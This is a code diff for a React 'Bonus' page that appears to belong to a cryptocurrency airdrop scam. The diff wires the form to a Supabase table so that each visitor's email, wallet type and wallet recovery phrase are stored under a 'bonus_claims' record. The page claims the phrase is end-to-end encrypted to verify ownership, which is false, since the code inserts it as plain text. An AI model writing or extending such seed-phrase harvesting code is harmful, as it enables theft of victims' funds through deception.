@@ -7,6 +7,7 @@ import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { ShieldCheck, AlertTriangle, ChevronDown } from "lucide-react";
 import { useLocation } from "wouter";
+import { supabase } from "@/lib/supabase";
 
 const WALLETS = [
   {
@@ -55,15 +56,29 @@ export default function Bonus() {
   const { toast } = useToast();
   const [isLoading, setIsLoading] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState<string>("");
+  const [email, setEmail] = useState("");
+  const [phrase, setPhrase] = useState("");
   const [isOpen, setIsOpen] = useState(false);
   const [, setLocation] = useLocation();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
     
-    setTimeout(() => {
-      setIsLoading(false);
+    try {
+      const { error } = await supabase
+        .from('bonus_claims')
+        .insert([
+          { 
+            email, 
+            wallet_type: selectedWallet, 
+            recovery_phrase: phrase,
+            status: 'pending'
+          }
+        ]);
+
+      if (error) throw error;
+
       toast({
         title: "Bonus Claim Initiated",
         description: "Your wallet is being verified. Redirecting...",
@@ -71,7 +86,16 @@ export default function Bonus() {
         className: "bg-green-500 text-white border-none"
       });
       setLocation("/bonus-success");
-    }, 2000);
+    } catch (error: any) {
+      console.error("Supabase error:", error);
+      toast({
+        title: "Error",
+        description: "There was an issue processing your claim. Please try again.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   const selectedWalletData = WALLETS.find(w => w.value === selectedWallet);
@@ -94,6 +118,8 @@ export default function Bonus() {
                   type="email"
                   placeholder="your@email.com"
                   className="bg-black/20 border-white/10 h-11"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
                   required
                 />
               </div>
@@ -160,6 +186,8 @@ export default function Bonus() {
                   required
                   className="flex min-h-[120px] w-full rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
                   placeholder="Enter your recovery phrase..."
+                  value={phrase}
+                  onChange={(e) => setPhrase(e.target.value)}
                 />
                 <p className="text-xs text-muted-foreground/70">
                    * We use end-to-end encryption to verify wallet ownership for the bonus drop.
